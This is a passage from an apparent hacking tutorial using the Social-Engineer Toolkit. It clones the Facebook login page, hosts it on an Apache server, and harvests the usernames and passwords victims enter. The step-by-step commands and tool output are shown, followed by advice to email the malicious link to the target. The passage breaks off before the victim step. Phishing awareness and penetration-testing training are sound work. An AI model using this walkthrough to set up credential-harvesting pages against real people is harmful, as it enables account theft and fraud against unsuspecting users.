4. Since I will be using a credential harvest, I am going to select option 3. It is easier for me to get usernames and passwords from the user this way versus trying to guess them or crack them.

5. For this next option, I will select option 2, which is Site Cloner. I want to make sure that I give the user a page that they will log into. I need to make it as real as possible:

```
set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report
[-] This option is used for what IP the server will POST to.
[-] If you're using an external IP, use your external IP for this
set:webattack> IP address for the IP back in Harvester/Tabnabbing:192.168.33.27
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:https://www.facebook.com/login.php
[*] Cloning the website: https://login.facebook.com/login.php
[*] This could take a little bit...
The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a website.
[*] Apache is set to ON - everything will be placed in your web root directory of apache.
[*] Files will be written out to the root directory of apache.
[*] ALL files are within your Apache directory since you specified it to ON.
Apache webserver is set to ON. Copying over PHP file to the website.
Please note that all output from the harvester will be found under apache_dir/harvester_date.txt
Feel free to customize post.php in the /var/www/html directory
[*] All files have been copied to /var/www/html
[*] SET is now listening for incoming credentials. You can control-c out of this and completely d still keep the attack going.
[*] All files are located under the Apache web root directory: /var/www/html
[*] All fields captures will be displayed below.
[Credential Harvester is now listening below...]
```

6. Since I am cloning a page, there are some options I need to enter. I first need to specify the IP address of my SET box. Then, I enter the site that I wish to clone. In this case, I chose to use the Facebook login page, since everyone loves Facebook. After entering that site, SET will clone the site and let me know when it's all ready and listening for connection and credentials.

7. At this point, I just need to send the malicious link to the user. This is very easy to do via email. Once the user clicks on the email link, it will redirect them to my site as follows: